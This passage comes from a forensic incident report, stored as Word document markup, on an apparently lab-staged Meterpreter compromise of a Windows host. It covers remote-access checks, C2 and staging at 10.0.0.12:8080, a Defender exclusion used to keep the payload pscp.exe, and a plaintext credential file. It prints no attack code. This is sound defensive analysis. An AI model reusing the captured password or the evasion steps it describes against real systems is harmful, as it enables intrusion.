        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 11:09:53.533599</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational 21 | Microsoft-Windows-TerminalServices-LocalSessionManager | Remote Desktop Services: Session logon succeeded | Session ID: 2 | LOCAL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#23406</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-TerminalServices-LocalSessionManager%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.6 Remote access and lateral movement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I reviewed remote access and lateral movement. Nothing shows the host was controlled remotely by anything other than the Meterpreter session, or used as a pivot (F-013).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Checked, all negative:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **RDP:** fDenyTSConnections=1; LSM shows only local sessions; there are no 1149, 4778/4779 or type 10 events; no mstsc MRU, .rdp files or bitmap cache.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **PsExec:** no PSEXESVC service and no 5140/5145. PsExec binaries exist only in the analyst toolset and have no Prefetch entry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **WinRM:** no 6/91/168 events, no wsmprovhost and no ServerRemoteHost 400. The 142/145 events are benign listener enumeration.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Remote-access tools:** none installed. Their names appear only in KAPE targets and maps.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Shares:** no UNC ShellBags and no mapped drives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Network:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The only Sysmon EID 3 in the attack chain is powershell 736 → 10.0.0.12:8080/tcp at 11:10:55 UTC (RecordID 336).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- SRUM shows explorer.exe sending more outbound bytes (69 KB) in the interval ending 11:43, which fits C2 traffic.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Recorded:** Q4 answered (10.0.0.12:8080, probable); IOC I-012 added; note on false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-013: No remote access or lateral movement: no RDP, PsExec, WinRM, RMM or SMB-share activity; only network peer of the attack is 10.0.0.12 (TCP 8080)</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artifact:registry (recmd kroll)</w:t>
              <w:br/>
              <w:t>artifact:srum (network usage per application)</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-sysmon%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-winrm%4operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>lateral movement / remote access</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1021.001, T1021.002, T1021.006, T1219, T1071.001</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2022-07-19 23:09:06 → 2023-11-10 11:43:00</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>What I checked and what it showed:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **RDP:** HKLM\SYSTEM\ControlSet001\Control\Terminal Server fDenyTSConnections=1, so RDP was disabled (registry_kroll row 7137, LastWrite 2023-11-10 10:42:09). TerminalServices-LSM shows only local console sessions (21/22/41/42 at boot and logon). There are no 1149 or 4778/4779 events, no type 10 logons and no Terminal Server Client (mstsc MRU) key. $MFT has no .rdp files and no bcache*.bmc / cache*.bin bitmap cache. Prefetch has no MSTSC.EXE.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **PsExec and equivalents:** no PSEXESVC 7045 among the 19 System 7045 events. There are no 5140/5145 share-access events in Security. PsExec.exe and PsExec64.exe exist only in Desktop\Tools\Forensic_Program_Files\SysinternalsSuite, created 11:51:24/11:51:42 as part of the analyst toolset copy, and Prefetch has no PSEXEC entry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **WinRM:** WinRM/Operational has only 145/142/161/254 'Enumeration' of the local wsman/config/listener, with errorCode 2150858770 (refs evtx 24536/24539/24540/24543). These recur at every boot or service start from 2023-11-09 onward. There are no 6/91/168 events, no WSMPROVHOST in Prefetch and no PowerShell 400 with HostName=ServerRemoteHost.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Remote-access tools:** AnyDesk, TeamViewer, ScreenConnect, Splashtop and Atera appear only as KAPE target/map files under Desktop\Tools (for example mft row 119176 AnyDesk.tkape). None of them has an install folder, service or Prefetch entry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Shares and mapped drives:** ShellBags have no UNC paths and the registry has no Map Network Drive MRU. SMBServer 1010/1025/1027 and SmbClient 30810/30812 are only transport binding events at boot.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Network telemetry:** the only Sysmon EID 3 tied to the attack chain is powershell.exe PID 736 (GUID {e6e9f951-0f56-654e-af01-000000000500}, child of cmd 5848 of injected explorer 7324). It connected 10.0.0.124:50009 → 10.0.0.12:8080/tcp at 11:10:55.573 UTC (evtx row 18681, Sysmon RecordID 336) to download 1.exe. Sysmon logged no EID 3 for pscp.exe (PID 2196) or explorer.exe (PID 7324); the other EID 3 events come from OneDrive, EdgeUpdate, KAPE and TimelineExplorer. In SRUM NetworkUsage, explorer.exe sent 69,181 bytes and received 86,237 bytes in the interval ending 11:43:00. In the 10:15 interval, before the attack, it sent 3,284 bytes.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I found no evidence that anyone controlled the host remotely through native or commercial remote-access channels, or used it to move laterally. Remote control appears to have gone only through the Meterpreter session. The IP 10.0.0.12 is the attacker infrastructure: on port 8080/tcp it served the payloads (pscp.exe, 1.exe) and was reached from the injected process chain.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The Meterpreter reverse-channel socket (pscp.exe, then explorer 7324) was not captured. The Sysmon configuration probably excludes or does not match explorer.exe and the payload. The higher outbound byte count for explorer.exe in SRUM between 11:00 and 11:43 fits C2 traffic from the injected explorer, but SRUM does not record the remote endpoint.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>So 10.0.0.12 is confirmed as the C2/staging host. Port 8080 is confirmed for HTTP staging and is the most likely Meterpreter handler port, but that last point is an inference. The output of `netstat -ntb` (run at 11:12:23) was not collected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Limit: the absence of RDP, SMB and WinRM artefacts depends on retention of the Security and Operational logs. These logs cover the whole period from 2023-11-09, so I consider the absence meaningful.</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r>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:42:09.344932</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\ControlSet001\Control\Terminal Server</w:t>
              <w:br/>
              <w:t>Threat Hunting | RDP Connections Status | fDenyTSConnections=1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_C.csv#7137</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\config\SYSTEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:43:00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received=86237 sent=69181 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#111</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:00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received=68056 sent=3284 IF_TYPE_ETHERNET_CSMACD</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>srumecmd/20261019151050_SrumECmd_NetworkUsages_Output.csv#61</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\SRU\SRUDB.dat</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:06.409323</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-WinRM/Operational 145 | Microsoft-Windows-WinRM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#24540</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Windows\system32\winevt\logs\Microsoft-Windows-WinRM%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2022-07-19 23:09:06</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$SI modification (M)</w:t>
              <w:br/>
              <w:t>C:\Users\medmondson\Desktop\Tools\Forensic_Program_Files\SysinternalsSuite\PsExec.exe</w:t>
              <w:br/>
              <w:t>size=440216 [zero µs]</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_mft/mft.csv#137433</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\$MFT</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.7 User activity on files and folders</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I reviewed these sources: LNK (24), Jump Lists (auto/custom), ShellBags (44), RecentDocs, OpenSavePidlMRU, LastVisitedPidlMRU, Windows Timeline, the SIDR file index, $MFT, $UsnJrnl, the Recycle Bin and the USB context.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**F-014 (medium, confirmed): payload file lifecycle**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Edge downloaded pscp.exe from 10.0.0.12:8080 to Downloads four times.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Defender deleted the first and third copies (USN FileDelete at 10:16:44 and 10:19:36). The download at 10:19:53 (MFT entry 85774) survived.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 10:20:10 it was copied to C:\Payloads\pscp.exe (MFT 85781, Zone.Identifier kept).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 10:20:20 the Downloads original went to the Recycle Bin as $RHOVDEL.exe and $IHOVDEL.exe. It is still allocated, so it can be recovered and hashed (IOC I-013).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- ShellBags, Payloads.lnk and the Explorer Jump List also show the C:\Payloads browsing.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Timeline event T-013 added.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**F-015 (medium, probable): plaintext credential file**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 11:13:56 the user's Notepad (PID 932, GUID {e6e9f951-0f03-654e-aa01-000000000500}) saved Desktop\not_my_pass.txt. Its parent was the legitimate explorer 2432 (LogonId 0x153A9), not the injected explorer 7324.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The SIDR index holds the content: 'user: medmondson pass: password123!@#'.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Corroborating sources: Sysmon 1, 4798, $MFT, USN, OpenSave/LastVisited MRU, RecentDocs, LNK, Jump Lists and Windows Timeline.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- $SI LastAccess is 11:15:54, but I cannot attribute it to the attacker.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- IOC I-014 and timeline event T-014 added.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>**Not attack-related**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No attacker file activity outside what was already known (1.exe, test.exe, PSScriptPolicyTest).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- USB, tools and transcript activity is lab or analyst work and was put in a note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-014: File-system lifecycle of the payload: 3 Edge downloads of pscp.exe, copy to C:\Payloads\pscp.exe and original sent to the Recycle Bin (still recoverable as $RHOVDEL.exe)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artifact:jump lists (automatic)</w:t>
              <w:br/>
              <w:t>artifact:lnk files</w:t>
              <w:br/>
              <w:t>artifact:recycle bin ($i)</w:t>
              <w:br/>
              <w:t>artifact:shellbags</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>file activity</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1105, T1036.005, T1070.004</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2023-11-10 10:15:26.178698 → 2023-11-10 10:20:20.820023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>$UsnJrnl:$J shows Microsoft Edge writing http://10.0.0.12:8080/pscp.exe to C:\Users\medmondson\Downloads several times:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1) pscp.exe.2sw3jd0.partial → pscp.exe at 10:16:42.89, FileDelete 10:16:44.77 (MFT entry 85540; Defender quarantine, F-003).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2) pscp.exe.2v8nja0.partial at 10:17:53.81 (entry 85765).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3) pscp.exe.de35ks3.partial → pscp.exe at 10:19:36.23, FileDelete 10:19:36.49 (entry 85732).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4) After the C:\Payloads\ exclusion (10:19:24): pscp.exe.ycq6vri.partial → pscp.exe at 10:19:53.85 (entry 85774). This copy survived and got an ObjectIdChange at 10:19:58 because it was opened from Explorer.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
